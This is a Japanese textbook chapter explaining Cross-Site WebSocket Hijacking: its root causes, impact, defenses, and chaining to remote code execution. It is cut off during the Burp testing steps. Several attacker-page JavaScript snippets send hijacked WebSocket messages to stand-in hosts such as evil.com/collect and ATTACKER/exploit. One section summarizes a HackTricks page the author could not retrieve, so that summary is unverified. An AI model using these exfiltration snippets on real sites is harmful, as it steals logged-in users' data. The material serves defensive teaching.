# 第7章 CSWSH (Cross-Site WebSocket Hijacking)

## CSWSHの原理: Origin検証欠如とハンドシェイク

CSWSH（Cross-Site WebSocket Hijacking、クロスサイトWebSocketハイジャック）は、ひとことで言えば **「WebSocketのハンドシェイク（接続を確立する最初のHTTPリクエスト）に対するCSRF（クロスサイトリクエストフォージェリ）」** である。攻撃者が用意した悪意あるページを被害者が開いただけで、被害者のブラウザが被害者の認証情報（Cookieなど）を付けて標的サイトへWebSocket接続を張ってしまい、しかもその接続は攻撃者のJavaScriptから完全に制御できる——これがCSWSHの本質だ。

CSRFとの決定的な違いは **双方向性** にある。従来のCSRFは「攻撃者が被害者に代わって1回リクエストを送る（＝一方向の書き込み）」のが限界で、レスポンス本文は同一オリジンポリシー（SOP）によって攻撃者JSから読めない。ところがWebSocketは全二重（full-duplex）の通信路であり、CSWSHが成立すると攻撃者は **メッセージを送りつけるだけでなく、サーバから返ってくるメッセージも読み取れる**。つまり「操作」と「窃取」の両方が可能になる。ここがCSWSHを単なるCSRFの亜種ではなく、独立した重大クラスとして扱う理由である。

この章では、なぜこの攻撃が成立してしまうのかを **プロトコルとブラウザの挙動のレベル** で解剖する。核心は2点――「WebSocketハンドシェイクには標準の認証機構がない」ことと「WebSocketは同一オリジンポリシーの外にいる」こと――に尽きる。

### 前提知識: WebSocketハンドシェイクの仕組み

CSWSHを理解するには、まずWebSocket接続がどう始まるかを押さえる必要がある。WebSocket（RFC 6455）は、TCP上に全二重の双方向通信路を張るプロトコルだが、その接続確立は **通常のHTTP(S)リクエストから始まり、途中でプロトコルを「昇格（upgrade）」する** という独特の手順を踏む。

具体的には、ブラウザ（クライアント）が次のような **HTTP GETリクエスト** をサーバへ送る。これがハンドシェイクだ。

```http
GET /chat HTTP/1.1
Host: normal-website.com
Sec-WebSocket-Version: 13
Sec-WebSocket-Key: wDqumtseNBJdhkihL6PW7w==
Connection: keep-alive, Upgrade
Cookie: session=KOsEJNuflw4Rd9BDNrVmvwBF9rEijeE2
Upgrade: websocket
Origin: https://normal-website.com
```

各ヘッダの意味を分解する。

- **`Upgrade: websocket` / `Connection: Upgrade`**: このHTTPコネクションをWebSocketプロトコルへ昇格させたい、という宣言。
- **`Sec-WebSocket-Version: 13`**: 使用するWebSocketプロトコルのバージョン（RFC 6455は13）。
- **`Sec-WebSocket-Key`**: クライアントが生成するランダムなBase64値。ここが誤解されやすいが、**これは認証やセキュリティ用の値ではない**。PortSwiggerも明言している通り、この鍵は「キャッシュ（プロキシなどの中間装置）が古いWebSocketレスポンスを使い回すのを防ぐため」だけに存在する。サーバはこの値に固定文字列を連結してSHA-1でハッシュし、`Sec-WebSocket-Accept` として返すが、これは「相手が本当にWebSocketを解するサーバか」を確認するための握手（handshake）確認に過ぎず、クライアントの身元を保証するものではない。攻撃者のブラウザでも普通に生成される。
- **`Cookie: session=...`**: ここが問題の中心。**ハンドシェイクは通常のHTTPリクエストなので、ブラウザは対象ドメインのCookieを自動的に付与する。** 認証済みセッションCookieもここに載る。
- **`Origin: https://normal-website.com`**: このリクエストを開始したページのオリジン（スキーム＋ホスト＋ポート）を示すヘッダ。**CSWSH対策の主役となるのがこのヘッダだ。**

サーバがこの接続を受け入れると、次のように応答する。

```http
HTTP/1.1 101 Switching Protocols
Upgrade: websocket
Connection: Upgrade
Sec-WebSocket-Accept: 0FFP+2nmNIf/h+4BP36k9uzrYGk=
```

ステータスコード **`101 Switching Protocols`** が返った時点で、このTCPコネクションはHTTPのリクエスト/レスポンス往復モデルを卒業し、以後はWebSocketのフレーム（メッセージ）を双方向にやり取りする通信路になる。一度確立すれば、クライアントとサーバはどちらからでも任意のタイミングでメッセージを送れる。

> 出典: Cross-site WebSocket hijacking（PortSwigger Web Security Academy） — https://portswigger.net/web-security/websockets/cross-site-websocket-hijacking

### 根本原因1: ハンドシェイクには標準の認証機構がない

CSWSHが生まれる第一の構造的原因は、**WebSocketプロトコル自体が「ハンドシェイク時にクライアントをどう認証するか」を一切定めていない** ことにある。

RFC 6455の原文は次のように述べている（Christian Schneiderの原典が引用しているもの）。

> "This protocol doesn't prescribe any particular way that servers can authenticate clients during the WebSocket handshake. The WebSocket server can use any client authentication mechanism available to a generic HTTP server, such as cookies, HTTP authentication, or TLS authentication."
>
> （このプロトコルは、WebSocketハンドシェイクの間にサーバがクライアントをどう認証するかについて特定の方法を規定していない。WebSocketサーバは、Cookie・HTTP認証・TLS認証など、一般的なHTTPサーバで利用可能なあらゆるクライアント認証機構を使ってよい。）

つまりプロトコルは「認証はHTTPの世界にある既存の仕組みで各自やってくれ」と丸投げしている。そして現実のアプリケーションの大半は、最も手軽な **Cookieベースのセッション認証** を選ぶ。

ここに罠がある。Cookieベース認証は、リクエストがどこ（どのオリジン）から発生したかに関係なく、ブラウザがCookieを自動送信することで成立する。これはまさに **古典的なCSRFが成立するのと同じ条件** だ。ハンドシェイクが「Cookieだけ」に依存し、リクエストパラメータの中に **攻撃者が推測できない値（＝CSRFトークン）** を含んでいなければ、そのハンドシェイクは偽造可能である。

PortSwiggerはCSWSHが成立する条件を、テスト観点として次のように定式化している。

> 攻撃者がCSWSHを実行するには、「セッション管理をHTTP Cookieだけに依存し、リクエストパラメータ内にトークンやその他の予測不可能な値を一切用いていないハンドシェイクメッセージ」を見つける必要がある。

先に示した脆弱なハンドシェイクの例を思い出してほしい。あの中で「攻撃者が事前に推測できない値」は `Sec-WebSocket-Key` くらいだが、前述の通りこれは認証と無関係でブラウザが勝手に生成する。セッションを守るはずの `session` Cookieはブラウザが自動付与する。**予測不可能なパラメータがどこにもない** ——これが「CSWSHに脆弱なハンドシェイク」の指紋である。

> 出典: Cross-Site WebSocket Hijacking (CSWSH)（Christian Schneider, 2013） — https://christian-schneider.net/blog/cross-site-websocket-hijacking/
>
> 出典: Cross-site WebSocket hijacking（PortSwigger Web Security Academy） — https://portswigger.net/web-security/websockets/cross-site-websocket-hijacking

### 根本原因2: WebSocketは同一オリジンポリシーの外にある

第二の、そしてより厄介な構造的原因は、**WebSocket接続が同一オリジンポリシー（Same-Origin Policy, SOP）によって制限されない** ことだ。

普段Webセキュリティを学ぶと、「別オリジンへのリクエストはSOPやCORS（Cross-Origin Resource Sharing）が守ってくれる」という感覚が身につく。たとえば `fetch()` で別オリジンにアクセスしても、サーバが適切なCORSヘッダを返さなければ **レスポンスを読み取れない**。この「レスポンスが読めない」という制約こそが、従来のCSRFを「一方向の書き込み」にとどめてきた。

ところがWebSocketにはこの防壁が **そもそも存在しない**。Christian Schneiderの原典はこの点を核心として指摘する。

> "WebSockets are not restrained by the same-origin policy."
>
> （WebSocketは同一オリジンポリシーによって制約されない。）

なぜか。SOP／CORSの仕組みはXMLHttpRequestや`fetch`といったHTTP APIのために設計されたものであり、WebSocket API（`new WebSocket(url)`）はその枠組みの外で規定されているからだ。攻撃者ページ `https://evil.com` に置かれたJavaScriptが `new WebSocket("wss://normal-website.com/chat")` を実行すると、ブラウザは何のクロスオリジン制限もかけずに接続を試みる。しかもハンドシェイクはHTTPリクエストなので、`normal-website.com` のCookieが自動的に付く。

その結果:

1. 攻撃者ページのJSが、被害者の認証済みセッションで標的へWebSocket接続を確立できる（＝ハンドシェイクの偽造＝CSRF部分）。
2. さらにCORSと違い、**確立した接続を通じて送受信するメッセージを攻撃者JSが自由に読み書きできる**（＝ハイジャック部分＝双方向性）。

この「SOPの外」という性質が、CSWSHを普通のCSRFより格段に危険にしている。CORSが `fetch` のレスポンス読み取りを塞ぐのと違い、WebSocketには読み取りを塞ぐ層がないため、`onmessage` イベントで受け取ったデータをそのまま攻撃者サーバへ送り出せてしまう。

Christian Schneiderが挙げる典型シナリオはこうだ。株取引アプリ `wss://www.some-trading-application.com/trading/ws/stockPortfolio` に被害者がログイン中、別タブで攻撃者ページを開くと、攻撃者はこの認証済みWebSocketを勝手に開き、ポートフォリオ情報を読み取ったり、勝手に売買注文のメッセージを送ったりできる。

> 出典: Cross-Site WebSocket Hijacking (CSWSH)（Christian Schneider, 2013） — https://christian-schneider.net/blog/cross-site-websocket-hijacking/

#### なぜOriginヘッダが「唯一で最後の砦」になるのか

ここで冒頭のハンドシェイクにあった `Origin` ヘッダが効いてくる。SOPがWebSocketを守らない以上、**「このハンドシェイクはどのサイトから発生したか」をサーバ側で判断する材料は `Origin` ヘッダしかない**。

`Origin` ヘッダはブラウザが自動的かつ強制的に設定するヘッダで、JavaScriptから改ざんできない（`fetch` のカスタムヘッダのように上書きできない、ブラウザ管理下の「forbidden header」）。したがって攻撃者ページ `https://evil.com` からWebSocketを開けば、ハンドシェイクには必ず `Origin: https://evil.com` が付く。

**サーバがこの `Origin` を検証し、自分の許可したオリジン（例: `https://normal-website.com`）でなければ接続を拒否すれば、CSWSHは防げる。** 逆に言えば、`Origin` を検証していない（＝Origin検証欠如）サーバは、どのサイトから来たハンドシェイクでも受け入れてしまうため、CSWSHに脆弱になる。

この「Origin検証の欠如」という欠陥は、後にCWE（Common Weakness Enumeration）として正式に分類された。

- **CWE-1385: Missing Origin Validation in WebSockets（WebSocketにおけるOrigin検証の欠如）** ――2013年のChristian Schneiderの研究を契機に整理された脆弱性区分。

注意すべきは、Origin検証は「ゆるい実装」だと簡単に破られる点だ。よくある不完全な検証の例:

- **前方一致・部分一致で判定** → `https://normal-website.com.evil.com` や `https://evil-normal-website.com` を通してしまう。
- **`null` オリジンを許可** → `sandbox` 属性付き`iframe`やある種のリダイレクトで `Origin: null` を作れる場合、素通りする。
- **Originヘッダの欠如を「許可」として扱う** → 一部の非ブラウザクライアントやプロキシ経由でヘッダが落ちたケースを、誤って信頼済みと判定する。

したがって正しいOrigin検証は「許可リスト（allowlist）による厳密な完全一致」であるべきだ。

> 出典: Cross-Site WebSocket Hijacking (CSWSH)（Christian Schneider, 2013） — https://christian-schneider.net/blog/cross-site-websocket-hijacking/
>
> 出典: Cross-site WebSocket hijacking（PortSwigger Web Security Academy） — https://portswigger.net/web-security/websockets/cross-site-websocket-hijacking

### 攻撃の全体像（防御を理解するための原理説明）

ここまでの原理を統合すると、CSWSHが成立するときの流れは次のようになる。**本節はあくまで「なぜ防御が必要か」を理解するための仕組みの説明であり、実在サービスへの無許可の検証を推奨するものではない。**

1. **被害者が標的サイトにログイン中**（認証Cookieがブラウザに存在する）。
2. 被害者が **攻撃者の用意したページ** を開く（メール・SNS・広告経由など）。
3. 攻撃者ページのJavaScriptが標的サイトへWebSocket接続を開始する。ハンドシェイクには被害者のCookieが自動付与される（原因1）。SOPは接続を止めない（原因2）。
4. 標的サーバが `Origin` を検証していない（Origin検証欠如）ため、`Origin: https://evil.com` のハンドシェイクを受理し、`101 Switching Protocols` を返す。
5. 攻撃者JSは確立した認証済みWebSocket上で、任意メッセージを **送信**（不正操作）でき、サーバからのメッセージを **受信して読み取り**（データ窃取）、それを攻撃者サーバへ転送できる。

概念を示す最小限のクライアントJavaScript（攻撃者ページ側の考え方を理解するための擬似コード）は次のようになる。標的の実装により「接続直後に何を送ればデータが返るか」は異なるため、ここでは原理の骨格のみを示す。

```javascript
// 攻撃者ページ evil.com 上で動作するJS（原理説明用の擬似コード）
var ws = new WebSocket("wss://normal-website.com/chat");
// ↑ SOPに阻まれず接続開始。ブラウザが normal-website.com のCookieを自動付与するため
//   被害者の認証済みセッションでハンドシェイクが成立してしまう（Origin未検証の場合）。

ws.onopen = function () {
  // 多くのチャット/通知系WSは、接続後に「履歴をくれ」等のメッセージを送ると過去データを返す。
  ws.send("READY");
};

ws.onmessage = function (event) {
  // ★ ここが従来CSRFとの決定的な差。
  //   SOP/CORSに阻まれず、サーバからのメッセージ本文を攻撃者JSが読める。
  fetch("https://evil.com/collect", {
    method: "POST",
    body: event.data,          // 窃取したデータを攻撃者サーバへ送信
    mode: "no-cors"
  });
};
```

**なぜこう書けるのか** ――`new WebSocket()` がSOPの外で動く（原因2）から接続が張れ、Cookieが自動付与される（原因1）から認証を突破でき、`onmessage` で本文が読める（SOP非適用の帰結）から窃取が成立する。この3つが揃って初めて成立する点が重要で、裏を返せば **どれか1つでも塞げば防げる**。

### 影響: 「操作」と「窃取」の両取り

PortSwiggerはCSWSHの影響を2カテゴリに整理している。

- **不正な操作（Unauthorized actions）**: サーバ側の機微な操作がクライアント発のメッセージで駆動される設計だと、攻撃者は「サーバへ任意のメッセージを送信」してそれらの操作を起動できる。例: 設定変更、送金・注文、メッセージ投稿など。
- **データの傍受（Data interception）**: 標準的なCSRFと違い、ハイジャックしたWebSocket上で「アプリケーションと双方向にやり取り」できるため、サーバから被害者に向けて流れるメッセージを「傍受し、被害者ユーザーのデータを取得」できる。例: チャット履歴、通知、トークン、個人情報など。

この双方向性ゆえに、CSWSHは条件次第で **アカウント乗っ取り（ATO）** にまで発展する。実際、WebSocket経由でワークスペース／アカウントが乗っ取られた事例として **CVE-2023-0957（Gitpod）** が知られる。CSWSHのようにOrigin検証欠如を突く脆弱性は近年も継続的に報告されており（例として CVE-2024-51775、CVE-2025-48068 など）、「古い2013年の話」ではなく現役の脅威である点に注意したい。

> 出典: Cross-site WebSocket hijacking（PortSwigger Web Security Academy） — https://portswigger.net/web-security/websockets/cross-site-websocket-hijacking
>
> 出典: Cross-Site WebSocket Hijacking (CSWSH)（Christian Schneider, 2013） — https://christian-schneider.net/blog/cross-site-websocket-hijacking/

### 防御: 原因を1つずつ塞ぐ

CSWSHの防御は、これまで見た「根本原因」に一対一で対応させると理解しやすい。Christian Schneiderの原典は主に2つの対策を挙げ、加えて根本的な代替案を示している。

#### 対策1: Originヘッダの厳密な検証（Origin検証欠如を塞ぐ）

サーバはハンドシェイク時に `Origin` ヘッダを検査し、**許可リスト（allowlist）に完全一致するオリジンだけ** を受理する。前述の通り、部分一致・前方一致・`null`許可・ヘッダ欠如の黙認は避ける。これは「原因2（SOPの外）」を人力で埋める措置に相当する。

```python
# 概念例: ハンドシェイク受理前にOriginを完全一致で検証する（原理説明用）
ALLOWED_ORIGINS = {"https://normal-website.com"}

def on_handshake(request):
    origin = request.headers.get("Origin")
    if origin not in ALLOWED_ORIGINS:   # 部分一致でなく集合の完全一致で判定
        reject_connection(403)          # ← Origin未許可なら接続を拒否
        return
    accept_connection()
```

ただしOriginヘッダはブラウザ発のリクエストにしか付かない（≒ブラウザ以外のクライアントは自由に詐称できる）ため、これ単独を全信頼の根拠にはできない。CSWSHは「被害者のブラウザを踏み台にする」攻撃なので、ブラウザ経由のCSWSH対策としてはOrigin検証が有効に効く一方、認証そのものは次のトークン方式で担保するのが堅牢だ。

#### 対策2: CSRFトークン方式（ハンドシェイクにセッション固有の乱数を要求する＝原因1を塞ぐ）

ハンドシェイクのパラメータに **セッションごとにランダムなトークン** を含めることを必須とし、サーバがそれを検証する。攻撃者ページはこのトークン値を知り得ない（SOPにより標的サイトのDOM/レスポンスから読めない）ため、正しいハンドシェイクを組み立てられず、偽造が失敗する。これは古典的なCSRF対策をWebSocketハンドシェイクに持ち込んだものだ。「原因1（Cookieだけに依存する認証）」を直接無効化する。

#### 対策3（根本策）: Webセッションに依存しないトークン認証をWebSocket内で行う

Christian Schneiderが挙げる最も堅牢な代替案は、**そもそもWebSocketエンドポイントからWebセッション（Cookie）を参照しない** ことだ。代わりに、WebSocketプロトコルの内側で独自のトークンベース認証・認可を実装する。すなわち:

- ハンドシェイクのCookieに認証を頼らず、
- 接続確立後（またはハンドシェイクのパラメータ）で、アプリが発行した短命なアクセストークンを提示させ、それを検証する。

こうすると「ブラウザがCookieを自動付与する」という原因1のトリガーそのものが認証に効かなくなるため、CSWSHの前提が崩れる。設計段階で採用できるなら最も安全な方向性である。

##### 補助策

- **メッセージ本文の設計**: 機微な操作はクライアント発の単純なメッセージだけでは駆動しない（サーバ側で追加の認可・検証を行う）。
- **TLS（wss://）の使用**: 平文 `ws://` は経路上での盗聴・改ざんに晒される。CSWSH対策とは別軸だが、WebSocketセキュリティの基本として `wss://` を徹底する。

> 出典: Cross-Site WebSocket Hijacking (CSWSH)（Christian Schneider, 2013） — https://christian-schneider.net/blog/cross-site-websocket-hijacking/
>
> 出典: Cross-site WebSocket hijacking（PortSwigger Web Security Academy） — https://portswigger.net/web-security/websockets/cross-site-websocket-hijacking

### HackTricksによるハンドシェイク詳細（未取得のため補足）

> ⚠️ **未取得の資料**: 「HackTricks — Cross-Site WebSocket Hijacking (CSWSH)」は自動取得できませんでした（理由: ミラーサイト `hacktricks.boitatech.com.br` はTLS証明書のホスト名不一致で接続不可、正規サイト `book.hacktricks.wiki` はTollbit経由の `HTTP 402 Payment Required` で本文取得がブロックされたため）。以下のURLからご自身で直接ご覧ください: https://book.hacktricks.wiki/en/pentesting-web/cross-site-websocket-hijacking-cswsh.html （元指定URL: https://hacktricks.boitatech.com.br/pentesting-web/cross-site-websocket-hijacking-cswsh ）

（以下は未取得資料の補足として一般知識に基づく解説です）

HackTricksのCSWSHページは、実務的なテスト観点として概ね次の内容をまとめている（本教科書の他資料と整合する範囲での一般的な要約）。

- **脆弱なハンドシェイクの見分け方**: ハンドシェイクリクエストを傍受し、認証がCookieだけに依存していて、パラメータにCSRFトークン相当の予測不可能値がないことを確認する。前掲のPortSwiggerの指紋と同じ観点である。
- **`Origin` を改変して挙動を観察する**: ハンドシェイクの `Origin` ヘッダを別ドメインに書き換えても `101 Switching Protocols` が返り接続が確立するなら、Origin検証が欠如している疑いが強い。逆に許可オリジン以外を拒否するなら検証が効いている。
- **`Sec-WebSocket-Key` は認証ではない**: この値はキャッシュ回避用でありセキュリティ上意味を持たない、という点をHackTricksも強調する（PortSwiggerと同旨）。
- **PoCの骨格**: `new WebSocket()` で標的へ接続し、`onmessage` で受信データを攻撃者サーバへ送出する、本章で示したものと同型のクライアントJSを用いる。
- **検証環境の原則**: これらの確認は、自分が権限を持つ検証用環境（ローカルの脆弱アプリや、許可されたバグバウンティ対象）に限定して行うべきである。実在サービス・本番環境への無許可の検証は行わない。

正確な最新の手順・コードは、上記URLの原文を直接参照されたい。

### まとめ

CSWSHは、次の3つの事実が重なったときに成立する「WebSocketハンドシェイクへのCSRF」である。

1. **ハンドシェイクは通常のHTTPリクエスト** なので、ブラウザが認証Cookieを自動付与する（RFC 6455が認証方式を規定していない結果、Cookie認証が使われがち）。
2. **WebSocketは同一オリジンポリシーの外** にあるため、クロスオリジン接続が阻まれず、しかもメッセージ本文を攻撃者JSが読める（双方向性＝CSRFより危険）。
3. **サーバが `Origin` を検証していない**（Origin検証欠如＝CWE-1385）ため、攻撃者ページ発のハンドシェイクを受理してしまう。

防御はこの3点に対応する。**Originの厳密な許可リスト検証**、**ハンドシェイクへのCSRFトークン要求**、そして根本策として **WebSocketセッションをCookieに依存させず独自トークンで認証する** こと。`Sec-WebSocket-Key` はキャッシュ回避用でセキュリティには寄与しないという点も、初学者が誤解しやすいので押さえておきたい。次節以降では、この原理を踏まえた具体的な検出手法と、メッセージ経由のインジェクションなど発展的な論点を扱う。

## CSWSHの実践とRCEチェーン

前節までで CSWSH（Cross-Site WebSocket Hijacking）の基本原理 ―― WebSocket のハンドシェイクが「ブラウザが自動送信する Cookie」で認証されつつ、「Origin ヘッダの検証がサーバ実装任せ」であるために、悪性サイトから被害者の認証済みセッションを乗っ取れる ―― を確認した。本節では、その乗っ取りを実際にどう組み立て、単なる情報窃取からどのようにして **RCE（Remote Code Execution：遠隔コード実行）チェーン**へと発展しうるのかを、公開されている実務者向け解説を軸に仕組みレベルで掘り下げる。

> ⚠️ **本節のスコープ**：本節は防御・検知の理解を目的とする。掲載するコードは「なぜ攻撃が成立するのか」を説明するための最小限の例示であり、実在サービスや本番環境への無許可検証、破壊的手順、演習ラボの解答手順は一切書かない。自分が管理・許可された検証環境でのみ挙動を確認すること。

---

### CSWSH が「CSRF の WebSocket 版」である理由

CSWSH はしばしば「CSRF（Cross-Site Request Forgery：クロスサイトリクエストフォージェリ、被害者のブラウザに意図しないリクエストを送らせる攻撃）の WebSocket 版」と表現される。これは比喩ではなく、成立条件が構造的に同じだからだ。攻撃が成立するには、サーバ側に次の**三つの実装ミスが同時に**存在している必要がある。

1. **Origin ヘッダを厳格に検証していない**（どこからの接続でも受け入れる）
2. **セッション Cookie で認証している**（ブラウザが自動で付与する資格情報に依存）
3. **CSRF トークン（推測不能な一回性の値）をハンドシェイクに要求していない**

CORS（Cross-Origin Resource Sharing）で保護される通常の XHR/fetch とは異なり、WebSocket のハンドシェイクには **プリフライト（事前確認の `OPTIONS` リクエスト）が存在しない**。つまりブラウザは「このクロスオリジン接続を許可してよいか」をサーバに事前に問い合わせず、いきなり `Upgrade` ハンドシェイクを送る。したがって「クロスオリジンだからブラウザが止めてくれる」という CORS 的な安全網は WebSocket には効かない。防御線は事実上「サーバが Origin を見て弾くか否か」の一点に集約される。

> 出典: Cross-site WebSocket hijacking: understanding and exploiting CSWSH — https://pentest-tools.com/blog/cross-site-websocket-hijacking-cswsh

#### RFC 6455 が防御をアプリ開発者に丸投げしている

この「サーバ任せ」は WebSocket プロトコルの規格（RFC 6455、2011年標準化）に由来する。RFC 6455 の 10.2 節（セキュリティ考慮事項）は次のように述べている。

> "Servers that are not intended to process input from any web page but only for certain sites SHOULD verify the |Origin| field."
>（任意の Web ページからの入力を処理する意図がなく特定サイトのみを対象とするサーバは、Origin フィールドを検証すべきである）

ここで重要なのは動詞が **SHOULD（推奨）であって MUST（必須）ではない**点だ。しかも「ブラウザが強制する」とは書かれていない。Origin ヘッダ自体は**ブラウザが設定し、JavaScript から改竄できない**信頼できる値だが、その値を**見て弾くかどうかはサーバ実装の裁量**になっている。この規格上の「宙ぶらりん」こそが CSWSH の温床である。Origin を検証しないサーバは、悪性サイト（例：`http://hacker.com`）からのハンドシェイクをそのまま受理してしまう。

> 出典: Can't Stop, Won't Stop Hijacking WebSockets (Black Hills InfoSec) — https://www.blackhillsinfosec.com/cant-stop-wont-stop-hijacking-websockets/

---

### 成立の前提条件（環境依存を明記）

CSWSH は「サーバが Origin を検証しない」だけでは完全には成立しない。**ブラウザが Cookie をクロスサイトで送るか**という、時事性のある条件が絡む。整理すると次の通り。

| 前提 | 内容 | 補足 |
| --- | --- | --- |
| サーバ側 | ハンドシェイクで Origin を検証していない | 検証していれば `403` で弾かれ不成立 |
| Cookie 設定 | セッション Cookie が `SameSite=None` | `Lax`/`Strict` だとクロスサイトで送られず不成立 |
| ブラウザ | Chrome / Chromium 系など | Firefox は Total Cookie Protection で緩和されうる |
| 被害者状態 | 対象アプリに認証済みセッションを保持 | ログイン中でなければ乗っ取る資格情報がない |

ここでの分岐点は **`SameSite` 属性**である。`SameSite=None`（かつ `Secure`）の Cookie は、クロスサイトの WebSocket ハンドシェイクにもブラウザが自動付与するため乗っ取りが成立する。逆に **2020年以降 Chrome/Firefox は Cookie の既定を `SameSite=Lax` に変更**しており、明示的に `None` を指定していないアプリでは、そもそもクロスサイト接続に Cookie が乗らず CSWSH は成立しにくくなった。つまり「明示的に `SameSite=None` を設定しているレガシー/クロスドメイン構成」が主な残存リスクである。この点は年・ブラウザ実装に強く依存するため、検証時は必ず対象環境の Cookie 属性と実挙動を確認する必要がある。

> 出典: Can't Stop, Won't Stop Hijacking WebSockets (Black Hills InfoSec) — https://www.blackhillsinfosec.com/cant-stop-wont-stop-hijacking-websockets/

---

### 乗っ取りペイロードの構造と「なぜ動くか」

CSWSH の実体は、被害者のブラウザ上で動く数行の JavaScript に尽きる。Pentest-Tools が示す最小ペイロードを見る。

```html
<script>
    var ws = new WebSocket('wss://your-websocket-url');
    ws.onopen = function() {
        ws.send("READY");
    };
    ws.onmessage = function(event) {
        fetch('https://your-collaborator-url', {method: 'POST', mode: 'no-cors', body: event.data});
    };
</script>
```

このコードの各行がなぜ成立に寄与するのかを分解する。

- `new WebSocket('wss://your-websocket-url')` ―― 悪性ページ内で対象サーバへの WebSocket 接続を開始する。この瞬間、ブラウザは対象ドメイン宛の Cookie（`SameSite=None` かつ被害者が認証済みなら）を**自動的にハンドシェイクに添付**する。攻撃者の JavaScript は Cookie の中身を読まないし読めないが、**「読まずとも送られる」ことがすべて**である。これが CSRF と同じ「アンビエント権限（環境的に付随する権限）の悪用」だ。
- `ws.onopen` → `ws.send("READY")` ―― 接続確立後にアプリのプロトコルに沿った初期メッセージ（例では `"READY"`）を送る。多くのチャット系/リアルタイム系アプリは、接続直後に「これまでの履歴」や「状態」をサーバから push する設計になっており、この一言が履歴のダンプを誘発する。
- `ws.onmessage` → `fetch(..., {mode:'no-cors', body:event.data})` ―― サーバから届いたメッセージ（被害者の会話履歴・個人情報・トークン等）を攻撃者サーバへ**外部送出（exfiltration）**する。`mode:'no-cors'` を使うのは、攻撃者サーバのレスポンスを読む必要がなく「送りつけられればよい」ため。CORS で応答が読めなくても送信自体は成立する。

Black Hills の例では、外部送出に `fetch` の GET でクエリに Base64 を載せる変種も示されている。

```javascript
<script>
    var ws = new WebSocket('wss://TARGET/chat');
    ws.onopen = function() { ws.send("READY"); };
    ws.onmessage = function(event) {
        fetch('https://ATTACKER/exploit?msg=' + btoa(event.data));
    };
</script>
```

`btoa()` で Base64 化するのは、メッセージ本文に含まれる `&` や改行など URL を壊す文字を安全に運ぶためであり、暗号化ではない点に注意。

> 出典: Cross-site WebSocket hijacking (Pentest-Tools) — https://pentest-tools.com/blog/cross-site-websocket-hijacking-cswsh
> 出典: Can't Stop, Won't Stop Hijacking WebSockets (Black Hills InfoSec) — https://www.blackhillsinfosec.com/cant-stop-wont-stop-hijacking-websockets/

#### 「フォームまるごと再利用」型の乗っ取りページ

Black Hills の解説では、単発の外部送出スクリプトだけでなく、**対象アプリのチャット UI（CSS・JS・フォーム）をまるごと悪性ページに複製**する手口も紹介されている。要点は、対象アプリの `chat.js` などの正規スクリプトを攻撃者ページから直接読み込むことで、被害者のブラウザ上に**本物と同じ双方向通信を再現**し、乗っ取った接続を通じて任意の操作を仕込める点にある。

```html
<!DOCTYPE html>
<html>
  <head>
    <title>Cross-site WebSocket hijacking</title>
    <!-- 対象アプリの正規 CSS/JS をそのまま読み込む -->
  </head>
  <body>
    <form id="chatForm" action="wss://TARGET/chat">
      <textarea id="message-box" name="message" maxlength=500></textarea>
      <button type="submit">Send</button>
    </form>
    <script src="https://TARGET/resources/js/chat.js"></script>
  </body>
</html>
```

なぜこれが成立するか。正規の `chat.js` は「同一オリジンで動くこと」を暗黙の前提に書かれているが、`new WebSocket()` の接続先は絶対 URL で対象ドメインを指すため、**どのオリジンから実行されても対象サーバへ繋がる**。Origin 検証がなければ、攻撃者ページ上で動く正規スクリプトが被害者の Cookie で認証された双方向チャネルを開通させてしまう。これは「単に履歴を盗む」以上に危険で、**攻撃者が任意のメッセージをアプリのプロトコルで送り込める**ことを意味する。この「双方向性」こそが、次に述べる RCE チェーンの入口になる。

> 出典: Can't Stop, Won't Stop Hijacking WebSockets (Black Hills InfoSec) — https://www.blackhillsinfosec.com/cant-stop-wont-stop-hijacking-websockets/

---

### CSWSH から RCE へ：チェーンの原理

CSWSH 単体の直接的インパクトは「機密性の侵害（履歴・データの窃取）」だが、WebSocket は**双方向**であるため、乗っ取った接続を通じて**サーバへ任意のメッセージを送れる**。ここに、WebSocket メッセージ処理側の別の脆弱性が組み合わさると、影響は一気に跳ね上がる。Black Hills が報告した実例チェーンの構造は次の通り。

1. **入口（CSWSH）**：悪性サイトが被害者（管理者ポータルにログイン中）の WebSocket を乗っ取る。
2. **本体（WebSocket 内の RCE）**：その WebSocket メッセージハンドラ側に、受信メッセージをサーバ上で実行・解釈してしまう脆弱性（＝sink：入力が最終的に実行される危険な代入先。例：受信文字列を OS コマンドやデシリアライズに渡す）が存在した。
3. **成果（リバースシェル）**：乗っ取ったチャネルに RCE ペイロードを送り込み、WebSocket をトンネルにして攻撃者インフラへ**リバースシェル**を張る。

Black Hills の原文は次のように述べている。

> "A CSWSH vulnerability was discovered in an admin portal along with a remote code execution vulnerability within the WebSocket. This allowed an exploit chain to be crafted where a malicious site would hijack the victim's WebSocket and then establish a reverse shell through the WebSocket back to the attacker's infrastructure."
>（管理者ポータルの CSWSH と、WebSocket 内の RCE が同時に見つかった。これにより、悪性サイトが被害者の WebSocket を乗っ取り、その WebSocket を通じて攻撃者インフラへリバースシェルを張るチェーンが構成できた）

ここで理解すべき原理は、**CSWSH は「認証境界を越える運び屋」に過ぎない**という点だ。RCE 自体は WebSocket メッセージ処理の実装欠陥（コマンドインジェクション、安全でないデシリアライズ、テンプレートインジェクションなど）が原因である。しかし通常こうした管理機能は「認証済み管理者しか到達できない」ため単体では外部から突けない。CSWSH がその「認証済み管理者の権限」を悪性サイトへ**横流し**することで、本来届かない sink に外部からペイロードを届ける経路が開通する。**「到達不能だった攻撃面が、被害者のセッションを踏み台に到達可能になる」**――これがチェーンの本質だ。

#### 権限昇格の実例

同じ原理は RCE でなくとも「権限昇格」に化ける。Black Hills の別の実例では、ボランティア用と行政職員用の二つのポータルがあり、双方の動的機能が WebSocket に依存していた。悪性ページが**行政職員の WebSocket を乗っ取り、管理タスクを実行**できたという。Pentest-Tools も、HackerOne の報告例として「閲覧者（reader）権限から管理者による文書改変へ昇格した」CSWSH を挙げている。いずれも「乗っ取ったチャネルで高権限の操作メッセージを送れる」という双方向性の帰結である。

> 出典: Can't Stop, Won't Stop Hijacking WebSockets (Black Hills InfoSec) — https://www.blackhillsinfosec.com/cant-stop-wont-stop-hijacking-websockets/
> 出典: Cross-site WebSocket hijacking (Pentest-Tools) — https://pentest-tools.com/blog/cross-site-websocket-hijacking-cswsh

---

### 検出：手動テストと自動スキャン

#### 手動テスト（Burp Suite）

Black Hills が示す検出手順の骨子は次の通り。**Origin を書き換えても `403` で弾かれないか**を確認するのが核心である。

1. Burp Suite Proxy の **WebSockets history** で WebSocket 通信を捕捉する（多くは AJAX 操作中に確立される）。
